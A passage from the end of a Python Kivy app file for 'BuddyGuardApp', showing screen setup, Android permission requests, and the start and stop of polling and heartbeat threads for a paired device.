        except Exception: pass

    def _reset(self, *_):
        store_del('device')
        App.get_running_app().stop_polling()
        app = App.get_running_app()
        app.sm.transition = FadeTransition()
        app.sm.current    = 'key_entry'


# ============================================================
# APP
# ============================================================
class BuddyGuardApp(App):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.poller: Poller | None = None
        self.hb: HBThread | None   = None
        self.sm: ScreenManager | None = None

    def build(self):
        Window.clearcolor = DARK
        self.sm = ScreenManager()
        self.sm.add_widget(KeyScreen(name='key_entry'))
        self.sm.add_widget(HomeScreen(name='home'))

        if store_has('device') and store_get('device', 'paired', False):
            self.sm.current = 'home'
            Clock.schedule_once(lambda dt: self.start_polling(), 0.4)
        else:
            self.sm.current = 'key_entry'

        if IS_ANDROID and _perms_ok:
            try:
                request_permissions([
                    Permission.CAMERA,
                    Permission.RECORD_AUDIO,
                    Permission.WRITE_EXTERNAL_STORAGE,
                    Permission.READ_EXTERNAL_STORAGE,
                    Permission.POST_NOTIFICATIONS,
                ])
            except Exception: pass

        return self.sm

    def start_polling(self):
        uid = store_get('device', 'uid')
        if not uid: return
        self.stop_polling()
        self.poller = Poller(uid, self); self.poller.start()
        self.hb     = HBThread(uid);    self.hb.start()
        try:
            self.sm.get_screen('home').set_status("⚡ Connected — real-time active", GREEN)
        except Exception: pass

    def stop_polling(self):
        if self.poller:
            try: self.poller.stop()
            except Exception: pass
            self.poller = None
        if self.hb:
            try: self.hb.stop()
            except Exception: pass
            self.hb = None

    def on_stop(self):
        self.stop_polling()
        _release_wl()


if __name__ == '__main__':
    BuddyGuardApp().run()
